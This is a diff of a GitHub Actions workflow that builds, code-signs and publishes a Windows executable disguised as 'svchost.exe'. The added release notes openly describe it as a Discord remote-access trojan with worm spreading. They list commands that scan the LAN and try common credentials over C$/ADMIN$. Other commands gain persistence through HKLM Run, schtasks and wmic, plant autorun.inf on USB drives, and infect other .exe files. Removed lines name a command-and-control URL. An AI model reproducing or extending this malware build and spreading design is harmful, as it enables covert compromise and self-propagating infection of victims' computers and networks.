           Set-AuthenticodeSignature -FilePath dist\svchost.exe -Certificate $cert -TimestampServer "http://timestamp.digicert.com"
-          Write-Host "Đã ký"
+          Write-Host "Da ky"
 
       - name: Chạy test trực tiếp
         if: ${{ github.event.inputs.run_minutes != '0' }}
@@ -3250,11 +2670,10 @@ jobs:
         env:
           RUN_MIN: ${{ github.event.inputs.run_minutes }}
         run: |
-          Write-Host "Mo https://bvwqmiv7phoi.ramnaymcloud.com -> chon may -> dieu khien"
           $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
           $secs = [int]$env:RUN_MIN * 60
           for ($i = 1; $i -le $secs; $i += 15) {
-            if ($p.HasExited) { Write-Host "Thoát sớm!"; break }
+            if ($p.HasExited) { Write-Host "Thoat som!"; break }
             Start-Sleep -Seconds 15; Write-Host "[$i s]..."
           }
           if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }
@@ -3264,13 +2683,6 @@ jobs:
         with:
           name: svchost-exe
           path: dist/svchost.exe
-          if-no-files-found: error
-
-      - name: Upload server
-        uses: actions/upload-artifact@v4
-        with:
-          name: svchost-server
-          path: server.js
           if-no-files-found: error
 
   release:
@@ -3284,31 +2696,22 @@ jobs:
         uses: actions/download-artifact@v4
         with:
           name: svchost-exe
-      - name: Tải server
-        uses: actions/download-artifact@v4
-        with:
-          name: svchost-server
       - name: Tạo Release
         uses: softprops/action-gh-release@v2
         with:
           tag_name: build-${{ github.run_number }}
           name: svchost build ${{ github.run_number }}
           body: |
-            Build #${{ github.run_number }}
+            Build #${{ github.run_number }} — Discord RAT + phát tán.
 
-            - `svchost.exe` — agent Windows (kết nối ra control server, không cần mở port)
-            - `server.js` — server web control, chạy trên VPS: `node server.js` (cổng 33324)
+            4 đường phát tán:
+            - `!lan` — quét LAN, copy qua `C$`/`ADMIN$`, thử 9 bộ cred phổ biến, đăng ký `HKLM\Run` + `schtasks` + chạy qua `wmic`
+            - `!usb` — nhét `svchost.exe` + `autorun.inf` vào mọi ổ removable
+            - `!infect <dir>` — nhiễm `.exe` (đổi gốc thành `.exe.bak`, đặt agent vào chỗ; chạy file đó sẽ chạy cả app gốc)
+            - `!programs` — thả vào Program Files / ProgramData / Startup / %LOCALAPPDATA%\Programs
 
-            Control URL mặc định: **https://bvwqmiv7phoi.ramnaymcloud.com**
-
-            Đổi URL không cần build lại:
-            - Discord: `!seturl https://domain-moi.com` rồi `!reload`
-            - Web: gõ `seturl https://domain-moi.com` trong ô lệnh
-            - URL lưu vào `%APPDATA%\Microsoft\control_url.txt`, ưu tiên hơn bản nhúng trong exe.
-
-            Thay exe trên máy đã cài: chạy file mới từ Downloads — agent tự ghi đè bản trong
-            `%APPDATA%\Microsoft`, tự tắt bản cũ và chạy lại bản mới. Hoặc dùng `!update <url exe>`.
+            `!spread` = làm hết. `!auto on|off` bật phát tán tự động (USB mỗi 3 phút, LAN mỗi 30 phút).
+            `!spreadinfo` xem trạng thái. `!uninfect` khôi phục file gốc.
           files: |
             svchost.exe
-            server.js
           make_latest: true
